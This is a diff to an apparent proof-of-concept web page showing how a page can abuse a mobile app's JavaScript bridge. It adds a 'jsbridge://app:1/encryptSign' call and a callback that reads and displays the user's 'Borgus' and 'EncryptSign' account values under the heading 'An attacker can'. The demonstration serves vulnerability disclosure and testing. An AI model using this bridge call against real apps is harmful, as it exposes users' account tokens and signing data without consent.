@@ -51,7 +51,8 @@
     <p><span class="bold-and-larger">An attacker can:</span></p>
 
     <p><span class="larger">Get Your Account Info:</span></p>
-    <p style="font-size: 15px;" id="Cookie"></p>
+    <p style="font-size: 15px;" id="Borgus"></p>
+    <p style="font-size: 15px;" id="EncryptSign"></p>
 
     <p><span class="larger">Get Your Geolocation Info:</span></p>
     <p style="font-size: 15px;" id="PreciseGeolocation"></p> 
@@ -77,8 +78,18 @@
     }
 
     function execCallback(callbackID, retval){
+        var json = retval;
+        switch(callbackID){
+            case 1:
+                document.getElementById("Borgus").innerText = "Your Borgus: \n" + json.borgus;
+                document.getElementById("EncryptSign").innerText = "Your EncryptSign: \n" + json.encryptSign;
+                break;
+
+        }
         console.log(JSON.stringify(retval));
     }
+
+    fetchData('jsbridge://app:1/encryptSign?query={"params":{}}');
 
 
 
